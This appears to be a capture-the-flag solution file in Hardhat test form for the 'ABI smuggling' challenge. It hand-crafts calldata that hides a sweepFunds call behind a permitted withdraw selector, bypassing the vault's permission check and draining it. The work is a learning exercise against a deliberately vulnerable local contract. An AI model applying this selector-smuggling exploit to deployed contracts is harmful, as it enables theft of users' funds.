const { ethers } = require("hardhat")
const { expect } = require("chai")

describe("[Challenge] ABI smuggling", function () {
    let deployer, player, recovery
    let token, vault

    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, player, recovery] = await ethers.getSigners()

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy()

        // Deploy Vault
        vault = await (await ethers.getContractFactory("SelfAuthorizedVault", deployer)).deploy()
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0)

        // Set permissions
        const deployerPermission = await vault.getActionId("0x85fb709d", deployer.address, vault.address) //sweepFunds
        const playerPermission = await vault.getActionId("0xd9caed12", player.address, vault.address) //withdraw
        await vault.setPermissions([deployerPermission, playerPermission])
        expect(await vault.permissions(deployerPermission)).to.be.true
        expect(await vault.permissions(playerPermission)).to.be.true

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE)

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE)
        expect(await token.balanceOf(player.address)).to.eq(0)

        // Cannot call Vault directly
        await expect(vault.sweepFunds(deployer.address, token.address)).to.be.revertedWithCustomError(
            vault,
            "CallerNotAllowed"
        )
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, "CallerNotAllowed")
    })

    it("Execution", async function () {
        /** CODE YOUR SOLUTION HERE */
        //Looking through the code, the only way to drain the wallet is to call the sweepFunds function,
        //however, the function uses the onlyThis modifier and therefore can only be called by the contract itself
        //the withdraw function won't get us very far, because WITHDRAWAL_LIMIT & WAITING_PERIOD are constants and can't be changed

        //However, the contract inherits from AuthorizedExecutor, which contains an interesting function: execute,
        //that accepts a target address and some arbitrary bytes data => here we can provide whatever we want and this looks promising

        //What are the hurdles to overcome? We need to pass the following requirement: if (!permissions[getActionId(selector, msg.sender, target)])
        //looking at the before-hook above, we have the following 2 permissions:
        //const deployerPermission = await vault.getActionId("0x85fb709d", deployer.address, vault.address) => sweepFunds selector
        //const playerPermission = await vault.getActionId("0xd9caed12", player.address, vault.address) => withdraw selector

        //So, this means, we can't directly specify the sweepFunds selector in the actionData for execute, because, msg.sender will be
        //our player address and we won't pass the requirement
        //However, we are alloweed to use the selector for the withdraw function and that way we ppass the requirement

        //THe selector is retrieved from the calldata at the offset: 3 32 bytes words + 4 bytes (for the selector) =>
        //so, exactly at this position, we will place the withdraw selector

        //For the txn calldata, we will provide the selector for the execute function (first 4 bytes), then we have 3 32 byte words
        //and next we have the selector for withdraw
        //The first argument of execute is the target address => this is the address of the vault contract and it will be encoded
        //as the first word (just after the execute selector)

        //the second arg is the bytes data => bytes are like arrays, so the first part of the encoded data indicates the position
        //where thhe actual bytes data is located and then, at that indicated position, we have to specify the length of our bytes data
        //and just below (in the following 32 byte word) we find the actual data

        //This means, the second word (just after the vault address) will pe the position value => we already know, the withdraw selector
        //is at the position 3 words + 4B (4+32*3) =>, so after our position value, we need to add an additional word =>
        //here we can write whatever we want, that data is not needed => this is just to push the withdraw selector to
        //position 0x60 (the fourth word after the execute selector).

        //So, for the second word (the position of the bytes data) we can indicate the position right after the withdraw selector,
        //which is 0x64 (0x60 + 4B for withdraw selector)
        //the word right after the withdraw selector (at pos 0x64) indictes the length of our bytes data => the sweepFunds function
        //has 2 address arguments (encoded as 2 seperate words) and before those 2 words, we also need to place the sweepFunds selector =>
        //so, the data length will by 2 words + 4B = 0x44
        //right after the position value, we place the sweepFunds selector, the the receiver address and finally the token address

        //The layout will look like this - for easier reading, I just put the function selectors in their on lines =>
        //however everything will be concatenated:

        //0x1cff79c                                                         => execute selector
        //000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512  => vault address
        //0000000000000000000000000000000000000000000000000000000000000064  => position where bytes data starts
        //0000000000000000000000000000000000000000000000000000000000000000  => our additional word - content does not matter
        //d9caed12                                                          => withdraw selector
        //0000000000000000000000000000000000000000000000000000000000000044  => length of bytes actionData
        //85fb709d                                                          => sweepFunds selector
        //0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc  => receiver address
        //0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3  => token address

        // function execute(address target, bytes calldata actionData)
        // function withdraw(address token, address recipient, uint256 amount)
        // function sweepFunds(address receiver, address token)

        // check the various function selectors => will be hardcoded for the calldata below
        let iface = new ethers.utils.Interface(["function execute(address, bytes)"])
        console.log("execute sig: ", iface.getSighash("execute")) //0x1cff79cd

        iface = new ethers.utils.Interface(["function sweepFunds(address, address)"])
        console.log("sweepFunds sig: ", iface.getSighash("sweepFunds")) //0x85fb709d

        iface = new ethers.utils.Interface(["function withdraw(address, address,uint256)"])
        console.log("withdraw sig: ", iface.getSighash("withdraw")) //0xd9caed12

        // create calldata
        let abi = ethers.utils.defaultAbiCoder
        let params1 = "0x1cff79cd" //execute
        let params2 = abi.encode(["address", "uint256"], [vault.address, 100]) //100 is hex64 => position, where actionData starts
        //let params3 = abi.encode(["uint256"], [0])
        let params3 = ethers.utils.hexZeroPad("0x0", 32)

        let params4 = "0xd9caed12" //withdraw
        let params5 = abi.encode(["uint256"], [68])

        abi = ["function sweepFunds(address,address)"]
        iface = new ethers.utils.Interface(abi)
        let params6 = iface.encodeFunctionData("sweepFunds", [recovery.address, token.address])

        let params = ethers.utils.hexConcat([params1, params2, params3, params4, params5, params6])
        //console.log(params)

        // send the txn
        let tx = {
            from: player.address,
            to: vault.address,
            data: params,
            gasLimit: 3000000,
        }
        await player.sendTransaction(tx)
    })

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        expect(await token.balanceOf(vault.address)).to.eq(0)
        expect(await token.balanceOf(player.address)).to.eq(0)
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE)
    })
})
